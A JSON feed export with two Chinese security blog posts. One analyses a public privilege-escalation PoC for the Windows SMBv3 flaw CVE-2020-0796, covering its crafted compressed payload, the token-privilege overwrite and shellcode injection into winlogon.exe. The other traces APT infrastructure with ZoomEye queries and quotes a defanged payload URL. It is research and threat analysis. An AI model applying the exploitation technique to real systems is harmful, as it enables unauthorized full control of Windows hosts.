{"code":1,"isDone":false,"toInsertArticleList":[{"createdTime":"2020-08-25 05:14:48","updatedTime":"2020-08-25 05:14:48","title":"CVE-2020-0796 Windows SMBv3 LPE Exploit POC 分析","link":"https://blog.knownsec.com/?p=5022","description":"\n<p><strong>作者：SungLin@知道创宇404实验室</strong><br><strong>时间：2020年4月2日</strong><br><strong>英文版本：<a href=\"https://paper.seebug.org/1165/\">https://paper.seebug.org/1165/</a></strong></p>\n\n\n\n<h2 id=\"0x00\">0x00 漏洞背景</h2>\n\n\n\n<p>2020年3月12日微软确认在Windows 10最新版本中存在一个影响SMBv3协议的严重漏洞，并分配了CVE编号CVE-2020-0796，该漏洞可能允许攻击者在SMB服务器或客户端上远程执行代码，3月13日公布了可造成BSOD的poc，3月30日公布了可本地特权提升的poc， 这里我们来分析一下本地特权提升的poc。</p>\n\n\n\n<h2 id=\"0x01\">0x01 漏洞利用原理</h2>\n\n\n\n<p>漏洞存在于在srv2.sys驱动中，由于SMB没有正确处理压缩的数据包，在解压数据包的时候调用函数<code>Srv2DecompressData</code>处理压缩数据时候，对压缩数据头部压缩数据大小<code>OriginalCompressedSegmentSize</code>和其偏移<code>Offset</code>的没有检查其是否合法，导致其相加可分配较小的内存，后面调用<code>SmbCompressionDecompress</code>进行数据处理时候使用这片较小的内存可导致拷贝溢出或越界访问，而在执行本地程序的时候，可通过获取当前本地程序的<code>token+0x40</code>的偏移地址，通过发送压缩数据给SMB服务器，之后此偏移地址在解压缩数据时候拷贝的内核内存中，通过精心构造的内存布局在内核中修改token将权限提升。</p>\n\n\n\n<h2 id=\"0x02-token\">0x02 获取Token</h2>\n\n\n\n<p>我们先来分析下代码，POC程序和smb建立连接后，首先会通过调用函数<code>OpenProcessToken</code>获取本程序的Token，获得的Token偏移地址将通过压缩数据发送到SMB服务器中在内核驱动进行修改，而这个Token就是本进程的句柄的在内核中的偏移地址，Token是一种内核内存结构，用于描述进程的安全上下文，包含如进程令牌特权、登录ID、会话ID、令牌类型之类的信息。</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/e839f709-e836-4d08-bdd9-ce917ed821c5.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>以下是我测试获得的Token偏移地址：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/c2b9ca0e-a025-4f47-970b-ca788b775036.png-w331s\" alt=\"\" /></figure>\n\n\n\n<h2 id=\"0x03\">0x03 压缩数据</h2>\n\n\n\n<p>接下来poc会调用<code>RtCompressBuffer</code>来压缩一段数据，通过发送这段压缩数据到SMB服务器，SMB服务器将会在内核利用这个token偏移，而这段数据是<code>'A'*0x1108+ (ktoken + 0x40)</code>。</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/27e73493-4b33-48db-9440-863ad8958ae3.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>而经压缩后的数据长度0x13，之后这段压缩数据除去压缩数据段头部外，发送出去的压缩数据前面将会连接两个相同的值<code>0x1FF2FF00BC</code>，而这两个值将会是提权的关键。</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/874f188c-fe31-4e60-91d2-e9633ab5a3b9.png-w331s\" alt=\"\" /></figure>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/259e9f98-ab2f-4508-8636-fc2795eac68e.png-w331s\" alt=\"\" /></figure>\n\n\n\n<h2 id=\"0x04\">0x04 调试</h2>\n\n\n\n<p>我们先来进行调试,首先因为这里是整数溢出漏洞，在<code>srv2!Srv2DecompressData</code>函数这里将会因为加法<code>0xffff ffff +  0x10 = 0xf</code>导致整数溢出，并且进入<code>srvnet!SrvNetAllocateBuffer</code>分配一个较小的内存。</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/687b44c7-6681-4f71-a3f9-fbe4b9cdf962.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>在进入了<code>srvnet!SmbCompressionDecompress</code>然后进入<code>nt!RtlDecompressBufferEx2</code>继续进行解压，最后进入函数<code>nt!PoSetHiberRange</code>，再开始进行解压运算，通过<code>OriginalSize= 0xffff ffff</code>与刚开始整数溢出分配的<code>UnCompressBuffer</code>存储数据的内存地址相加得一个远远大于限制范围的地址，将会造成拷贝溢出。</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/6342e33b-1c0d-41c5-9a2f-8fc3e8e5c451.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>但是我们最后需要复制的数据大小是0x1108，所以到底还是没有溢出，因为真正分配的数据大小是0x1278,通过<code>srvnet!SrvNetAllocateBuffer</code>进入池内存分配的时候，最后进入<code>srvnet!SrvNetAllocateBufferFromPool</code>调用<code>nt!ExAllocatePoolWithTag</code>来分配池内存：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/8bb0294d-7cb2-4662-938d-43360d3ec1ec.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>虽然拷贝没有溢出，但是却把这片内存的其他变量给覆盖了，包括<code>srv2!Srv2DecompressDatade</code>的返回值,&#160;<code>nt!ExAllocatePoolWithTag</code>分配了一个结构体来存储有关解压的信息与数据，存储解压数据的偏移相对于<code>UnCompressBuffer_address</code>是固定的<code>0x60</code>,而返回值相对于<code>UnCompressBuffer_address</code>偏移是固定的<code>0x1150</code>,也就是说存储<code>UnCompressBuffer</code>的地址相对于返回值的偏移是<code>0x10f0</code>,而存储<code>offset</code>数据的地址是<code>0x1168</code>,相对于存储解压数据地址的偏移是<code>0x1108</code>。</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/114aad47-e011-497b-9b83-182716c8fdd6.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>有一个问题是为什么是固定的值，因为在这次传入的<code>OriginalSize= 0xffff ffff</code>，<code>offset=0x10</code>，乘法整数溢出为<code>0xf</code>，而在<code>srvnet! SrvNetAllocateBuffer</code>中，对于传入的大小<code>0xf</code>做了判断，小于<code>0x1100</code>的时候将会传入固定的值<code>0x1100</code>作为后面结构体空间的内存分配值进行相应运算。</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/1a8a5123-db20-420f-99dd-dbf882228e85.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>然后回到解压数据这里，需解压数据的大小是<code>0x13</code>，解压将会正常进行，拷贝了<code>0x1108</code>&#160;个'A'后，将会把8字节大小<code>token+0x40</code>的偏移地址拷贝到'A'的后面。</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/d346a9a8-fe60-4249-8a09-cbe23455d664.png-w331s\" alt=\"\" /></figure>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/817b5b70-186b-42ce-97e8-955a9fb46c5d.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>解压完并复制解压数据到刚开始分配的地址后正常退出解压函数，接着就会调用<code>memcpy</code>进行下一步的数据拷贝，关键的地方是现在<code>rcx</code>变成了刚开始传入的本地程序的<code>token+0x40</code>的地址！！</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/4b8dbfd7-0c6f-425b-ba1a-9b267696bcea.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>回顾一下解压缩后，内存数据的分布<code>0x1100(‘A’)+Token=0x1108</code>，然后再调用了<code>srvnet!SrvNetAllocateBuffer</code>函数后返回我们需要的内存地址，而v8的地址刚好是初始化内存偏移的<code>0x10f0</code>，所以<code>v8+0x18=0x1108</code>,拷贝的大小是可控的，为传入的<code>offset</code>大小是<code>0x10</code>,最后调用<code>memcpy</code>将源地址就是压缩数据<code>0x1FF2FF00BC</code>拷贝到目的地址是<code>0xffff9b893fdc46f0(token+0x40)</code>的后16字节将被覆盖，成功修改Token的值。</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/480c625a-a014-452d-a009-8477877a0a2d.png-w331s\" alt=\"\" /></figure>\n\n\n\n<h2 id=\"0x05\">0x05 提权</h2>\n\n\n\n<p>而覆盖的值是两个相同的<code>0x1FF2FF00BC</code>,为什么用两个相同的值去覆盖<code>token+0x40</code>的偏移呢，这就是在windows内核中操作Token提升权限的方法之一了，一般是两种方法：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/6d7775e5-21ea-4339-83b3-57221ceb3ad8.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>第一种方法是直接覆盖Token，第二种方法是修改Token，这里采用的是修改Token。</p>\n\n\n\n<p>在windbg中可运行<code>kd&#62; dt _token</code>的命令查看其结构体：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/7099a9d3-faf7-460a-8441-4cc1724e5838.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>所以修改<code>_SEP_TOKEN_PRIVILEGES</code>的值可以开启禁用, 同时修改<code>Present</code>和<code>Enabled</code>为<code>SYSTEM</code>进程令牌具有的所有特权的值<code>0x1FF2FF00BC</code>，之后权限设置为：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/fb8009e9-31e6-47c7-93ea-e7bea0a5b7a1.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>这里顺利在内核提升了权限，接下来通过注入常规的<code>shellcode</code>到windows进程<code>winlogon.exe</code>中执行任意代码:</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/85320ff0-bfd4-4f83-8101-350c6e914649.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>如下所示执行了弹计算器的动作:</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/dcd2ced1-7991-42af-a770-d170148aba25.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p><strong>参考链接:</strong></p>\n\n\n\n<ol><li><a href=\"https://github.com/eerykitty/CVE-2020-0796-PoC\">https://github.com/eerykitty/CVE-2020-0796-PoC</a></li><li><a href=\"https://github.com/danigargu/CVE-2020-0796\">https://github.com/danigargu/CVE-2020-0796</a></li><li><a href=\"https://ired.team/miscellaneous-reversing-forensics/windows-kernel/how-kernel-exploits-abuse-tokens-for-privilege-escalation\">https://ired.team/miscellaneous-reversing-forensics/windows-kernel/how-kernel-exploits-abuse-tokens-for-privilege-escalation</a></li></ol>\n\n\n\n<hr class=\"wp-block-separator\" />\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg\" alt=\"Paper\" /></figure>\n\n\n\n<p>本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<a href=\"https://paper.seebug.org/1164/\">https://paper.seebug.org/1164/</a><br></p>\n","descriptionType":"html","publishedDate":"Fri, 31 Jul 2020 03:31:59 +0000","feedId":2536,"bgimg":"https://images.seebug.org/content/images/2020/04/e839f709-e836-4d08-bdd9-ce917ed821c5.png-w331s","linkMd5":"3be24b3dafcda97d2cd1d8bdc8240c69","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn30@2020_1/2020/08/24/21-14-50-563_ac7401f7478d11f3.webp","destWidth":839,"destHeight":543,"sourceBytes":10167,"destBytes":40778,"author":"叶霖 杨","articleImgCdnMap":{"https://images.seebug.org/content/images/2020/04/e839f709-e836-4d08-bdd9-ce917ed821c5.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn30@2020_1/2020/08/24/21-14-50-563_ac7401f7478d11f3.webp","https://images.seebug.org/content/images/2020/04/c2b9ca0e-a025-4f47-970b-ca788b775036.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn97@2020_4/2020/08/24/21-14-55-901_2a855cc60aafbc07.webp","https://images.seebug.org/content/images/2020/04/27e73493-4b33-48db-9440-863ad8958ae3.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx/cdn35@2020_4/2020/08/24/21-14-59-501_6f0b462b83a2b3af.webp","https://images.seebug.org/content/images/2020/04/874f188c-fe31-4e60-91d2-e9633ab5a3b9.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn52@2020_5/2020/08/24/21-15-00-289_41c56cf5d658fa20.webp","https://images.seebug.org/content/images/2020/04/259e9f98-ab2f-4508-8636-fc2795eac68e.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn36@2020_6/2020/08/24/21-15-01-840_dc78156d2218e7c4.webp","https://images.seebug.org/content/images/2020/04/687b44c7-6681-4f71-a3f9-fbe4b9cdf962.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn90@2020_2/2020/08/24/21-14-56-366_05a16c7de95a6491.webp","https://images.seebug.org/content/images/2020/04/6342e33b-1c0d-41c5-9a2f-8fc3e8e5c451.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn14@2020_4/2020/08/24/21-14-57-195_fd12988740479b99.webp","https://images.seebug.org/content/images/2020/04/8bb0294d-7cb2-4662-938d-43360d3ec1ec.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn9@2020_5/2020/08/24/21-14-55-014_b5d9eca33e9e0589.webp","https://images.seebug.org/content/images/2020/04/114aad47-e011-497b-9b83-182716c8fdd6.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn14@2020_5/2020/08/24/21-14-54-506_6db1e9ca0cd62602.webp","https://images.seebug.org/content/images/2020/04/1a8a5123-db20-420f-99dd-dbf882228e85.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn18@2020_6/2020/08/24/21-14-57-387_52fa4a67c7556ce1.webp","https://images.seebug.org/content/images/2020/04/d346a9a8-fe60-4249-8a09-cbe23455d664.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn59@2020_5/2020/08/24/21-15-00-150_e3e280e0d9aeaa85.webp","https://images.seebug.org/content/images/2020/04/817b5b70-186b-42ce-97e8-955a9fb46c5d.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn31@2020_1/2020/08/24/21-14-59-501_6a7396f540ed5166.webp","https://images.seebug.org/content/images/2020/04/4b8dbfd7-0c6f-425b-ba1a-9b267696bcea.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn94@2020_6/2020/08/24/21-14-54-989_06928b5d92b302bf.webp","https://images.seebug.org/content/images/2020/04/480c625a-a014-452d-a009-8477877a0a2d.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn62@2020_2/2020/08/24/21-14-56-965_7ee22e8ed4edbc0a.webp","https://images.seebug.org/content/images/2020/04/6d7775e5-21ea-4339-83b3-57221ceb3ad8.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn93@2020_4/2020/08/24/21-14-55-939_e2082ba45429a567.webp","https://images.seebug.org/content/images/2020/04/7099a9d3-faf7-460a-8441-4cc1724e5838.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn68@2020_1/2020/08/24/21-15-00-419_0eaadf7813c91d4e.webp","https://images.seebug.org/content/images/2020/04/fb8009e9-31e6-47c7-93ea-e7bea0a5b7a1.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn10@2020_2/2020/08/24/21-14-52-821_c6015a371cfdd6ee.webp","https://images.seebug.org/content/images/2020/04/85320ff0-bfd4-4f83-8101-350c6e914649.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn50@2020_6/2020/08/24/21-14-56-970_4234ec662a38036a.webp","https://images.seebug.org/content/images/2020/04/dcd2ced1-7991-42af-a770-d170148aba25.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn3@2020_1/2020/08/24/21-14-59-429_2168a9ec2e81f076.webp","https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn7@2020_5/2020/08/24/21-15-00-499_446834a71d30acd0.webp"},"publishedOrCreatedDate":1598303688720},{"createdTime":"2020-08-25 05:14:48","updatedTime":"2020-08-25 05:14:48","title":"使用 ZoomEye 寻找 APT 攻击的蛛丝马迹","link":"https://blog.knownsec.com/?p=5011","description":"\n<p><strong>作者：Heige(a.k.a Superhei) of KnownSec 404 Team</strong><br><strong>时间：2020年5月25日</strong><br><strong>英文链接：<a href=\"https://paper.seebug.org/1220/\">https://paper.seebug.org/1220/</a></strong></p>\n\n\n\n<p>今年一月发布的ZoomEye 2020里上线了ZoomEye的历史数据查询API接口，这个历史数据接口还是非常有价值的，这里就介绍我这几天做的一些尝试追踪APT的几个案例。</p>\n\n\n\n<p>在开始之前首先你需要了解ZoomEye历史api接口的使用，参考文档：<a href=\"https://www.zoomeye.org/doc#history-ip-search\">https://www.zoomeye.org/doc#history-ip-search</a>&#160;这里可以使用的是ZoomEye SDK&#160;<a href=\"https://github.com/knownsec/ZoomEye\">https://github.com/knownsec/ZoomEye</a>&#160;另外需要强调说明下的是：<strong>ZoomEye线上的数据是覆盖更新的模式，</strong>也就是说第2次扫描如果没有扫描到数据就不会覆盖更新数据，ZoomEye上的数据会保留第1次扫描获取到的banner数据，这个机制在这种恶意攻击溯源里其实有着很好的场景契合点：恶意攻击比如Botnet、APT等攻击使用的下载服务器被发现后一般都是直接停用抛弃，当然也有一些是被黑的目标，也是很暴力的直接下线！所以很多的攻击现场很可能就被ZoomEye线上缓存。</p>\n\n\n\n<p>当然在ZoomEye历史api里提供的数据，不管你覆盖不覆盖都可以查询出每次扫描得到的banner数据，但是目前提供的ZoomEye历史API只能通过IP去查询，而不能通过关键词匹配搜索，所以我们需要结合上面提到的ZoomEye线上缓存数据搜索定位配合使用。</p>\n\n\n\n<h2 id=\"darkhotel-apt\">案例一：Darkhotel APT</h2>\n\n\n\n<p>在前几天其实我在“黑科技”知识星球里提到了，只是需要修复一个“bug”：这次Darkhotel使用的IE 0day应该是CVE-2019-1367 而不是CVE-2020-0674（感谢廋肉丁@奇安信），当然这个“bug”不影响本文的主题。</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/05/0a56d95a-1927-4b33-b998-ec6315cb36a1.jpg-w331s\" alt=\"\" /></figure>\n\n\n\n<p>从上图可以看出我们通过ZoomEye线上数据定位到了当时一个Darkhotel水坑攻击现场IP，我们使用ZoomEye SDK查询这个IP的历史记录：</p>\n\n\n\n<pre class=\"crayon-plain-tag\">╭─heige@404Team ~\n╰─$python                                                                                                                                    \nPython 2.7.16 (default, Mar 15 2019, 21:13:51)\n[GCC 4.2.1 Compatible Apple LLVM 10.0.0 (clang-1000.11.45.5)] on darwin\nType &#34;help&#34;, &#34;copyright&#34;, &#34;credits&#34; or &#34;license&#34; for more information.\n import zoomeye\n zm = zoomeye.ZoomEye(username=&#34;xxxxx&#34;, password=&#34;xxxx&#34;)\n zm.login()\n u'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpX...'\n data = zm.history_ip(&#34;202.x.x.x&#34;)\n 22</pre>\n\n\n\n<p>列举ZoomEye历史数据里收录这个IP数据的时间节点及对应端口服务</p>\n\n\n\n<pre class=\"crayon-plain-tag\">...\n &#38;gt;&#38;gt;&#38;gt;for i in data['data']:\n ...     print(i['timestamp'],i['portinfo']['port'])\n ...\n (u'2020-01-28T10:58:02', 80)\n (u'2020-01-05T18:33:17', 80)\n (u'2019-11-25T05:27:58', 80)\n (u'2019-11-02T16:10:40', 80)\n (u'2019-10-31T11:39:02', 80)\n (u'2019-10-06T05:24:44', 80)\n (u'2019-08-02T09:52:27', 80)\n (u'2019-07-27T19:22:11', 80)\n (u'2019-05-18T10:38:59', 8181)\n (u'2019-05-02T19:37:20', 8181)\n (u'2019-05-01T00:48:05', 8009)\n (u'2019-04-09T16:29:58', 8181)\n (u'2019-03-24T20:46:31', 8181)\n (u'2018-05-18T18:22:21', 137)\n (u'2018-02-22T20:50:01', 8181)\n (u'2017-03-13T03:11:39', 8181)\n (u'2017-03-12T16:43:54', 8181)\n (u'2017-02-25T09:56:28', 137)\n (u'2016-11-01T00:22:30', 137)\n (u'2015-12-30T22:53:17', 8181)\n (u'2015-03-13T20:17:45', 8080)\n (u'2015-03-13T19:33:15', 21)</pre>\n\n\n\n<p>我们再看看被植入IE 0day的进行水坑攻击的时间节点及端口：</p>\n\n\n\n<pre class=\"crayon-plain-tag\">&#38;gt;&#38;gt;&#38;gt; for i in data['data']:\n ...     if &#34;164.js&#34; in i['raw_data']:\n ...             print(i['timestamp'],i['portinfo']['port'])\n ...\n (u'2020-01-28T10:58:02', 80)\n (u'2020-01-05T18:33:17', 80)\n (u'2019-11-25T05:27:58', 80)\n (u'2019-11-02T16:10:40', 80)\n (u'2019-10-31T11:39:02', 80)\n (u'2019-10-06T05:24:44', 80)</pre>\n\n\n\n<p>很显然这个水坑攻击的大致时间区间是从2019-10-06 05:24:44到2020-01-28 10:58:02，另外这个IP很显然不是攻击者购买的VPS之类，而是直接攻击了某个特定的网站来作为“水坑”进行攻击，可以确定的是这个IP网站早在2019-10-06之前就已经被入侵了！从这个水坑的网站性质可以基本推断Darkhotel这次攻击的主要目标就是访问这个网站的用户！</p>\n\n\n\n<p>我们继续列举下在2019年这个IP开了哪些端口服务，从而帮助我们分析可能的入侵点：</p>\n\n\n\n<pre class=\"crayon-plain-tag\">&#38;gt;&#38;gt;&#38;gt; for i in data['data']:\n ...     if &#34;2019&#34; in i['timestamp']:\n ...             print(i['timestamp'],i['portinfo']['port'],i['portinfo']['service'],i['portinfo']['product'])\n ...\n (u'2019-11-25T05:27:58', 80, u'http', u'nginx')\n (u'2019-11-02T16:10:40', 80, u'http', u'nginx')\n (u'2019-10-31T11:39:02', 80, u'http', u'nginx')\n (u'2019-10-06T05:24:44', 80, u'http', u'nginx')\n (u'2019-08-02T09:52:27', 80, u'http', u'nginx')\n (u'2019-07-27T19:22:11', 80, u'http', u'nginx')\n (u'2019-05-18T10:38:59', 8181, u'http', u'Apache Tomcat/Coyote JSP engine')\n (u'2019-05-02T19:37:20', 8181, u'http', u'Apache Tomcat/Coyote JSP engine')\n (u'2019-05-01T00:48:05', 8009, u'ajp13', u'Apache Jserv')\n (u'2019-04-09T16:29:58', 8181, u'http', u'Apache httpd')\n (u'2019-03-24T20:46:31', 8181, u'http', u'Apache Tomcat/Coyote JSP engine')</pre>\n\n\n\n<p>很典型的JSP运行环境，在2019年5月的时候开了8009端口，Tomcat后台管理弱口令等问题一直都是渗透常用手段～～</p>\n\n\n\n<p>顺带提一句，其实这次的攻击还涉及了另外一个IP，因为这个IP相关端口banner因为更新被覆盖了，所以直接通过ZoomEye线上搜索是搜索不到的，不过如果你知道这个IP也可以利用ZoomEye历史数据API来查询这个IP的历史数据，这里就不详细展开了。</p>\n\n\n\n<h2 id=\"apt-c-01\">案例二：毒云藤（APT-C-01）</h2>\n\n\n\n<p>关于毒云藤（APT-C-01）的详细报告可以参考&#160;<a href=\"https://ti.qianxin.com/uploads/2018/09/20/6f8ad451646c9eda1f75c5d31f39f668.pdf\">https://ti.qianxin.com/uploads/2018/09/20/6f8ad451646c9eda1f75c5d31f39f668.pdf</a>我们直接把关注点放在</p>\n\n\n\n<p>“毒云藤组织使用的一个用于控制和分发攻击载荷的控制域名&#160;<a href=\"http://updateinfo.servegame.org/\">http://updateinfo.servegame.org</a>”</p>\n\n\n\n<p>“然后从&#160;<code>hxxp://updateinfo.servegame.org/tiny1detvghrt.tmp</code>&#160;下载 payload”</p>\n\n\n\n<p>URL上，我们先尝试找下这个域名对应的IP，显然到现在这个时候还没有多大收获：</p>\n\n\n\n<pre class=\"crayon-plain-tag\">╭─heige@404Team ~\n╰─$ping updateinfo.servegame.org\nping: cannot resolve updateinfo.servegame.org: Unknown host</pre>\n\n\n\n<p>在奇安信的报告里我们可以看到使用的下载服务器WEB服务目录可以遍历</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/05/9a7fbc7c-ccfc-4bc2-aca5-57a3a98f4642.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>所以我们应该可以直接尝试搜索那个文件名“tiny1detvghrt.tmp”，果然被我们找到了</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/05/9ab3dc59-053e-4cf1-8025-52c742ea4426.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>这里我们可以基本确定了<code>updateinfo.servegame.org</code>对应的IP为165.227.220.223 那么我们开始老套路查询历史数据：</p>\n\n\n\n<pre class=\"crayon-plain-tag\">&#38;gt;&#38;gt;&#38;gt; data = zm.history_ip(&#34;165.227.220.223&#34;)\n    &#38;gt;&#38;gt;&#38;gt; 9\n    &#38;gt;&#38;gt;&#38;gt; for i in data['data']:\n     ...     print(i['timestamp'],i['portinfo']['port'])\n     ...\n     (u'2019-06-18T19:02:22', 22)\n     (u'2018-09-02T08:13:58', 22)\n     (u'2018-07-31T05:58:44', 22)\n     (u'2018-05-20T00:55:48', 80)\n     (u'2018-05-16T20:42:35', 22)\n     (u'2018-04-08T07:53:00', 80)\n     (u'2018-02-22T19:04:29', 22)\n     (u'2017-11-21T19:09:14', 80)\n     (u'2017-10-04T05:17:38', 80)</pre>\n\n\n\n<p>继续看看这个<code>tiny1detvghrt.tmp</code>部署的时间区间：</p>\n\n\n\n<pre class=\"crayon-plain-tag\">&#38;gt;&#38;gt;&#38;gt; for i in data['data']:\n ...     if &#34;tiny1detvghrt.tmp&#34; in i['raw_data']:\n ...             print(i['timestamp'],i['portinfo']['port'])\n ...\n (u'2018-05-20T00:55:48', 80)\n (u'2018-04-08T07:53:00', 80)\n (u'2017-11-21T19:09:14', 80)</pre>\n\n\n\n<p>最起码可以确定从2017年11月底就已经开始部署攻击了，那么在这个时间节点之前还有一个时间节点2017-10-04 05:17:38，我们看看他的banner数据：</p>\n\n\n\n<pre class=\"crayon-plain-tag\">&#38;gt;&#38;gt;&#38;gt; for i in data['data']:\n ...     if &#34;2017-10-04&#34; in i['timestamp']:\n ...             print(i['raw_data'])\n ...\n HTTP/1.1 200 OK\n Date: Tue, 03 Oct 2017 21:17:37 GMT\n Server: Apache\n Vary: Accept-Encoding\n Content-Length: 1757\n Connection: close\n Content-Type: text/html;charset=UTF-8\n\n&#38;lt;!DOCTYPE HTML PUBLIC &#34;-//W3C//DTD HTML 3.2 Final//EN&#34;&#38;gt;\n&#38;lt;html&#38;gt;\n &#38;lt;head&#38;gt;\n  &#38;lt;title&#38;gt;Index of /&#38;lt;/title&#38;gt;\n &#38;lt;/head&#38;gt;\n &#38;lt;body&#38;gt;\n&#38;lt;h1&#38;gt;Index of /&#38;lt;/h1&#38;gt;\n  &#38;lt;table&#38;gt;\n   &#38;lt;tr&#38;gt;&#38;lt;th valign=&#34;top&#34;&#38;gt;&#38;lt; img src=&#34;/icons/blank.gif&#34; alt=&#34;[ICO]&quot;&#38;gt;&#38;lt;/th&#38;gt;&#38;lt;th&#38;gt;&#38;lt; a href=&#34; &#34;&#38;gt;Name&#38;lt;/ a&#38;gt;&#38;lt;/th&#38;gt;&#38;lt;th&#38;gt;&#38;lt; a href=&#34;?C=M;O=A&#34;&#38;gt;Last modified&#38;lt;/ a&#38;gt;&#38;lt;/th&#38;gt;&#38;lt;th&#38;gt;&#38;lt; a href=&#34;?C=S;O=A&#34;&#38;gt;Size&#38;lt;/ a&#38;gt;&#38;lt;/th&#38;gt;&#38;lt;th&#38;gt;&#38;lt; a href=&#34;?C=D;O=A&#34;&#38;gt;Description&#38;lt;/ a&#38;gt;&#38;lt;/th&#38;gt;&#38;lt;/tr&#38;gt;\n   &#38;lt;tr&#38;gt;&#38;lt;th colspan=&#34;5&#34;&#38;gt;&#38;lt;hr&#38;gt;&#38;lt;/th&#38;gt;&#38;lt;/tr&#38;gt;\n&#38;lt;tr&#38;gt;&#38;lt;td valign=&#34;top&#34;&#38;gt;&#38;lt; img src=&#34;/icons/unknown.gif&#34; alt=&#34;[   ]&quot;&#38;gt;&#38;lt;/td&#38;gt;&#38;lt;td&#38;gt;&#38;lt; a href=&#34;doajksdlfsadk.tmp&#34;&#38;gt;doajksdlfsadk.tmp&#38;lt;/ a&#38;gt;&#38;lt;/td&#38;gt;&#38;lt;td align=&#34;right&#34;&#38;gt;2017-09-15 08:21  &#38;lt;/td&#38;gt;&#38;lt;td align=&#34;right&#34;&#38;gt;4.9K&#38;lt;/td&#38;gt;&#38;lt;td&#38;gt;&#160;&#38;lt;/td&#38;gt;&#38;lt;/tr&#38;gt;\n&#38;lt;tr&#38;gt;&#38;lt;td valign=&#34;top&#34;&#38;gt;&#38;lt; img src=&#34;/icons/unknown.gif&#34; alt=&#34;[   ]&quot;&#38;gt;&#38;lt;/td&#38;gt;&#38;lt;td&#38;gt;&#38;lt; a href=&#34;doajksdlfsadk.tmp.1&#34;&#38;gt;doajksdlfsadk.tmp.1&#38;lt;/ a&#38;gt;&#38;lt;/td&#38;gt;&#38;lt;td align=&#34;right&#34;&#38;gt;2017-09-15 08:21  &#38;lt;/td&#38;gt;&#38;lt;td align=&#34;right&#34;&#38;gt;4.9K&#38;lt;/td&#38;gt;&#38;lt;td&#38;gt;&#160;&#38;lt;/td&#38;gt;&#38;lt;/tr&#38;gt;\n&#38;lt;tr&#38;gt;&#38;lt;td valign=&#34;top&#34;&#38;gt;&#38;lt; img 